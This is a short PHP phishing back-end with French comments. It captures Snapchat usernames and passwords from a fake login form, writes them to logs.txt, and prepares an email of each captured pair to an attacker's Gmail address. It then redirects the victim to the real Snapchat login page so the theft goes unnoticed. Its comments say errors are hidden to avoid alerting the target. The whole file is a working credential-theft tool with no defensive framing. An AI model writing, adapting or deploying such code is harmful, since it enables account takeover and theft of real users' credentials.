<?php
// Désactiver l'affichage des erreurs en production pour ne pas alerter la cible
error_reporting(0);

// Récupérer les données du formulaire
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Si les deux champs sont remplis
if (!empty($username) && !empty($password)) {
    // Format de la ligne à enregistrer
    $logEntry = date("Y-m-d H:i:s") . " | Username: " . $username . " | Password: " . $password . "\n";
    
    // Écrire dans le fichier logs.txt (création s'il n'existe pas)
    file_put_contents('logs.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Envoyer également les logs par email (optionnel)
    $to = "typicorrellico97@gmail.com"; // <--- REMPLACE PAR TON EMAIL
    $subject = "Snapchat Phishing - New Credentials";
    $message = "New credentials captured:\n\n" . $logEntry;
    $headers = "From: phishing@server.com";
    
    // Décommente la ligne suivante pour activer l'envoi par email (nécessite un serveur mail configuré)
    // mail($to, $subject, $message, $headers);
}

// Rediriger vers la vraie page de connexion Snapchat après un court délai
header('Location: https://accounts.snapchat.com/accounts/login?continue=%2Faccounts%2Fwelcome');
exit();
?>